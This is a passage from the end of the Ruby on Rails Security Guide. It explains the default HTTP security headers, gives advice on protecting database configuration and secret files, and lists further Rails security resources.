<pre class="ruby"><span class="ruby-identifier">config</span>.<span class="ruby-identifier">action_dispatch</span>.<span class="ruby-identifier">default_headers</span>.<span class="ruby-identifier">clear</span>
</pre>

<p>Here is a list of common headers:</p>

<p>X-Frame-Options <em>&#39;SAMEORIGIN&#39; in Rails by default</em> - allow
framing on same domain. Set it to &#39;DENY&#39; to deny framing at all or
&#39;ALLOWALL&#39; if you want to allow framing for all website. 
X-XSS-Protection <em>&#39;1; mode=block&#39; in Rails by default</em> - use
XSS Auditor and block page if XSS attack is detected. Set it to
&#39;0;&#39; if you want to switch XSS Auditor off(useful if response
contents scripts from request parameters)  X-Content-Type-Options
<em>&#39;nosniff&#39; in Rails by default</em> - stops the browser from
guessing the MIME type of a file.  X-Content-Security-Policy <a
href="http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html">A
powerful mechanism for controlling which sites certain content types can be
loaded from</a>  Access-Control-Allow-Origin Used to control which sites
are allowed to bypass same origin policies and send cross-origin requests. 
Strict-Transport-Security <a
href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">Used to
control if the browser is allowed to only access a site over a secure
connection</a></p>

<h2 id="label-Environmental+Security">Environmental Security<span><a href="#label-Environmental+Security">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>It is beyond the scope of this guide to inform you on how to secure your
application code and environments. However, please secure your database
configuration, e.g. <code>config/database.yml</code>, and your server-side
secret, e.g. stored in <code>config/secrets.yml</code>. You may want to
further restrict access, using environment-specific versions of these files
and any others that may contain sensitive information.</p>

<h2 id="label-Additional+Resources">Additional Resources<span><a href="#label-Additional+Resources">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>The security landscape shifts and it is important to keep up to date,
because missing a new vulnerability can be catastrophic. You can find
additional resources about (Rails) security here:</p>

<p>The Ruby on Rails security project posts security news regularly: <a
href="http://www.rorsecurity.info">www.rorsecurity.info</a>  Subscribe to
the Rails security <a
href="http://groups.google.com/group/rubyonrails-security">mailing list</a>
<a href="http://secunia.com/">Keep up to date on the other application
layers</a> (they have a weekly newsletter, too)  A <a
href="http://ha.ckers.org/blog/">good security blog</a> including the <a
href="http://ha.ckers.org/xss.html">Cross-Site scripting Cheat Sheet</a></p>
</main>



<footer id="validator-badges" role="contentinfo">
  <p><a href="http://validator.w3.org/check/referer">Validate</a>
  <p>Generated by <a href="http://docs.seattlerb.org/rdoc/">RDoc</a> 4.2.0.
  <p>Based on <a href="http://deveiate.org/projects/Darkfish-RDoc/">Darkfish</a> by <a href="http://deveiate.org">Michael Granger</a>.
</footer>

